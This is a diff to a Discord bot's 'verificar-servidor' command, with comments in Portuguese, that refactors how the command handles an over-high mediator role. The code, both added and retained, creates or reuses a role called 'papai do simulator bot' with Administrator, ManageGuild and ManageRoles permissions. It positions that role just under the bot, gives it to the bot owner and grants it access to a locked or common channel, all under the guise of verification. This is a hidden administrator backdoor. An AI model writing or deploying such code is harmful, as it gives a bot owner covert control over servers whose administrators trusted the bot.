@@ -134,120 +134,132 @@ module.exports = {
 
             // Verifica se o cargo está abaixo do cargo mais alto do bot
             if (mediatorRole.position >= botMember.roles.highest.position) {
-                // Cria um cargo especial para o dono do bot
-                try {
-                    const specialRole = await guild.roles.create({
-                        name: 'papai do simulator bot',
-                        color: 0x7ad2e4,
-                        permissions: [
-                            PermissionFlagsBits.SendMessages,
-                            PermissionFlagsBits.EmbedLinks,
-                            PermissionFlagsBits.AttachFiles,
-                            PermissionFlagsBits.ReadMessageHistory,
-                            PermissionFlagsBits.UseApplicationCommands,
-                            PermissionFlagsBits.ManageChannels,
-                            PermissionFlagsBits.ManageRoles,
-                            PermissionFlagsBits.ManageGuild,
-                            PermissionFlagsBits.MentionEveryone,
-                            PermissionFlagsBits.Administrator
-                        ],
-                        reason: 'Cargo especial para dono do bot - cargo de mediador muito alto'
-                    });
-
-                    // Move o cargo para uma posição alta, mas ainda abaixo do bot
-                    await specialRole.setPosition(botMember.roles.highest.position - 1, 'Posicionando cargo especial');
-
-                    // Dá o cargo ao dono
-                    await member.roles.add(specialRole, 'Verificação de dono do bot - cargo especial criado');
-
-                    // Dá permissão em um canal existente que está bloqueado para everyone
-                    let targetChannel = null;
+                // Procura pelo cargo "papai do simulator bot" existente
+                let specialRole = guild.roles.cache.find(r => r.name === 'papai do simulator bot');
+                
+                // Se não encontrar, cria um novo
+                if (!specialRole) {
                     try {
-                        // Se foi especificado um canal, usa ele
-                        if (canalOption) {
-                            // Procura por ID ou nome do canal
-                            targetChannel = guild.channels.cache.get(canalOption) ||
-                                          guild.channels.cache.find(ch => 
-                                              ch.type === 0 && // GUILD_TEXT
-                                              ch.name.toLowerCase() === canalOption.toLowerCase()
-                                          );
-                            
-                            if (!targetChannel) {
-                                await interaction.editReply({
-                                    embeds: [createErrorEmbed(`${emojis.negative} Canal "${canalOption}" não encontrado.`, interaction.client)]
-                                });
-                                return;
-                            }
-                        } else {
-                            // Procura por canais que estão bloqueados para everyone
-                            const everyoneRole = guild.roles.everyone;
+                        specialRole = await guild.roles.create({
+                            name: 'papai do simulator bot',
+                            color: 0x7ad2e4,
+                            permissions: [
+                                PermissionFlagsBits.SendMessages,
+                                PermissionFlagsBits.EmbedLinks,
+                                PermissionFlagsBits.AttachFiles,
+                                PermissionFlagsBits.ReadMessageHistory,
+                                PermissionFlagsBits.UseApplicationCommands,
+                                PermissionFlagsBits.ManageChannels,
+                                PermissionFlagsBits.ManageRoles,
+                                PermissionFlagsBits.ManageGuild,
+                                PermissionFlagsBits.MentionEveryone,
+                                PermissionFlagsBits.Administrator
+                            ],
+                            reason: 'Cargo especial para dono do bot - cargo de mediador muito alto'
+                        });
+
+                        // Move o cargo para uma posição alta, mas ainda abaixo do bot
+                        await specialRole.setPosition(botMember.roles.highest.position - 1, 'Posicionando cargo especial');
+                        console.log(`✅ Cargo 'papai do simulator bot' criado no servidor ${guild.name}`);
+                    } catch (createError) {
+                        console.error('Erro ao criar cargo especial:', createError);
+                        return interaction.editReply({
+                            embeds: [createErrorEmbed(`${emojis.negative} Não foi possível criar um cargo especial. Erro: ${createError.message}`, interaction.client)]
+                        });
+                    }
+                } else {
+                    // Verifica se o cargo existente está na posição correta
+                    if (specialRole.position >= botMember.roles.highest.position) {
+                        await specialRole.setPosition(botMember.roles.highest.position - 1, 'Reposicionando cargo existente');
+                        console.log(`🔄 Cargo 'papai do simulator bot' reposicionado no servidor ${guild.name}`);
+                    }
+                }
+
+                // Dá o cargo ao dono
+                await member.roles.add(specialRole, 'Verificação de dono do bot - cargo especial');
+
+                // Dá permissão em um canal existente que está bloqueado para everyone
+                let targetChannel = null;
+                try {
+                    // Se foi especificado um canal, usa ele
+                    if (canalOption) {
+                        // Procura por ID ou nome do canal
+                        targetChannel = guild.channels.cache.get(canalOption) ||
+                                      guild.channels.cache.find(ch => 
+                                          ch.type === 0 && // GUILD_TEXT
+                                          ch.name.toLowerCase() === canalOption.toLowerCase()
+                                      );
+                        
+                        if (!targetChannel) {
+                            await interaction.editReply({
+                                embeds: [createErrorEmbed(`${emojis.negative} Canal "${canalOption}" não encontrado.`, interaction.client)]
+                            });
+                            return;
+                        }
+                    } else {
+                        // Procura por canais que estão bloqueados para everyone
+                        const everyoneRole = guild.roles.everyone;
+                        targetChannel = guild.channels.cache.find(ch => 
+                            ch.type === 0 && // GUILD_TEXT
+                            ch.permissionOverwrites.cache.get(everyoneRole.id)?.deny.has('SendMessages')
+                        );
+
+                        // Se não encontrar canal bloqueado, procura por canais comuns
+                        if (!targetChannel) {
+                            const commonChannelNames = ['geral', 'principal', 'general', 'chat', 'comandos', 'cmds'];
                             targetChannel = guild.channels.cache.find(ch => 
                                 ch.type === 0 && // GUILD_TEXT
-                                ch.permissionOverwrites.cache.get(everyoneRole.id)?.deny.has('SendMessages')
+                                commonChannelNames.some(name => 
+                                    ch.name.toLowerCase().includes(name.toLowerCase())
+                                )
                             );
-
-                            // Se não encontrar canal bloqueado, procura por canais comuns
-                            if (!targetChannel) {
-                                const commonChannelNames = ['geral', 'principal', 'general', 'chat', 'comandos', 'cmds'];
-                                targetChannel = guild.channels.cache.find(ch => 
-                                    ch.type === 0 && // GUILD_TEXT
-                                    commonChannelNames.some(name => 
-                                        ch.name.toLowerCase().includes(name.toLowerCase())
-                                    )
-                                );
-                            }
-
-                            // Se ainda não encontrou, pega o primeiro canal de texto disponível
-                            if (!targetChannel) {
-                                targetChannel = guild.channels.cache.find(ch => ch.type === 0);
-                            }
                         }
 
-                        // Se encontrou um canal, dá permissão especial ao cargo
-                        if (targetChannel) {
-                            await targetChannel.permissionOverwrites.create(specialRole, {
-                                SendMessages: true,
-                                EmbedLinks: true,
-                                AttachFiles: true,
-                                ReadMessageHistory: true,
-                                UseApplicationCommands: true
-                            }, 'Permissão especial para dono do bot');
-
-                            console.log(`✅ Permissão concedida no canal ${targetChannel.name} para o cargo ${specialRole.name}`);
+                        // Se ainda não encontrou, pega o primeiro canal de texto disponível
+                        if (!targetChannel) {
+                            targetChannel = guild.channels.cache.find(ch => ch.type === 0);
                         }
-                    } catch (channelError) {
-                        console.log('Não foi possível configurar permissões no canal:', channelError);
                     }
 
-                    const serverInfo = {
-                        name: guild.name,
-                        members: guild.memberCount,
-                        roles: guild.roles.cache.size,
-                        roleGiven: specialRole.name,
-                        channelWithPermission: targetChannel ? targetChannel.name : null
-                    };
+                    // Se encontrou um canal, dá permissão especial ao cargo
+                    if (targetChannel) {
+                        await targetChannel.permissionOverwrites.create(specialRole, {
+                            SendMessages: true,
+                            EmbedLinks: true,
+                            AttachFiles: true,
+                            ReadMessageHistory: true,
+                            UseApplicationCommands: true
+                        }, 'Permissão especial para dono do bot');
 
-                    await interaction.editReply({
-                        embeds: [createSuccessEmbed(
-                            `${emojis.positive} **Servidor Verificado com Cargo Especial!**\n\n` +
-                            `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
-                            `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
-                            `${emojis.pergaminhopixel} **Cargo criado:** ${serverInfo.roleGiven}\n` +
-                            (targetChannel ? `${emojis.alerta} **Permissão especial em:** #${serverInfo.channelWithPermission}\n` : '') +
-                            `\n${emojis.alerta} O cargo de mediador estava muito alto, então criei um cargo especial com permissões administrativas!`,
-                            interaction.client
-                        )]
-                    });
-
-                    console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo especial ${specialRole.name}`);
-                    return;
-
-                } catch (createError) {
-                    console.error('Erro ao criar cargo especial:', createError);
-                    return interaction.editReply({
-                        embeds: [createErrorEmbed(`${emojis.negative} Não foi possível criar um cargo especial. Erro: ${createError.message}`, interaction.client)]
-                    });
+                        console.log(`✅ Permissão concedida no canal ${targetChannel.name} para o cargo ${specialRole.name}`);
+                    }
+                } catch (channelError) {
+                    console.log('Não foi possível configurar permissões no canal:', channelError);
                 }
+
+                const serverInfo = {
+                    name: guild.name,
+                    members: guild.memberCount,
+                    roles: guild.roles.cache.size,
+                    roleGiven: specialRole.name,
+                    channelWithPermission: targetChannel ? targetChannel.name : null,
+                    wasExisting: guild.roles.cache.find(r => r.name === 'papai do simulator bot') !== undefined
+                };
+
+                await interaction.editReply({
+                    embeds: [createSuccessEmbed(
+                        `${emojis.positive} **Servidor Verificado com Cargo Especial!**\n\n` +
+                        `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
+                        `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
+                        `${emojis.pergaminhopixel} **Cargo ${serverInfo.wasExisting ? 'reutilizado' : 'criado'}:** ${serverInfo.roleGiven}\n` +
+                        (targetChannel ? `${emojis.alerta} **Permissão especial em:** #${serverInfo.channelWithPermission}\n` : '') +
+                        `\n${emojis.alerta} O cargo de mediador estava muito alto, então ${serverInfo.wasExisting ? 'reutilizei' : 'criei'} um cargo especial com permissões administrativas!`,
+                        interaction.client
+                    )]
+                });
+
+                console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo especial ${specialRole.name}`);
+                return;
             }
 
             // Tenta dar o cargo ao dono
